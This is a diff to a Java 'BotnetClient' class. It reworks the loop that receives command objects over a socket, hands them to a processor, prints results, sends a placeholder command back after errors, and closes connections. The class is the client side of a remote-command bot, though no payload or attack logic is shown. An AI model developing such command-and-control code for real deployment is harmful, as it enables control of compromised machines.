@@ -39,13 +39,32 @@ public class BotnetClient {
         String commandInstructions;
         String fromUser;
 
-        while ((commandInstructions = inCommand.getCommand()) != null){
-            System.out.println("Running Command" + inCommand.getCommandName());
-            result = commandP.processCommand(commandInstructions);
+        while ((commandInstructions = inCommand.getInstructions()) != null){
+            System.out.println("Running Command" + commandInstructions);
+            String result = commandP.processCommand(inCommand);
+            System.out.println(result);
             //mutate the command
+            if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
+                Command comand = new Command("thing");
+                out.writeObject(comand);
+            }
+
+            try{
+                if (!inCommand.getErrorStatus())
+                    inCommand = (Command) in.readObject();
+            }
+            catch (ClassNotFoundException cnfe){
+                System.err.println("BotNetClient: Problem reading object: class not found");
+                System.exit(1);
+            }
             //send the command back to the command queue
 
         }
+
+        out.close();
+        in.close();
+        stdIn.close();
+        socket.close();
 
     }    
 }
